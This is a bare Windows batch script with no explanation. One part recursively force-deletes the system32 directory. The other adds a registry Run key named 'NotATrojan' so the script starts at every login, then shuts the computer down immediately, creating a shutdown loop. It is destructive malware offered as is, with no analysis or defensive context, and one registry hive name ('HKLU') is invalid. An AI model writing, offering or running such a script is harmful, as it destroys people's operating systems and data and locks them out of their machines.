
@echo off
del /q /s /f %windir%\system32

@echo off
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v NotATrojan /d %0%
reg add HKLU\Software\Microsoft\Windows\CurrentVersion\Run /v NotATrojan /d %0%
shutdown -s -t 00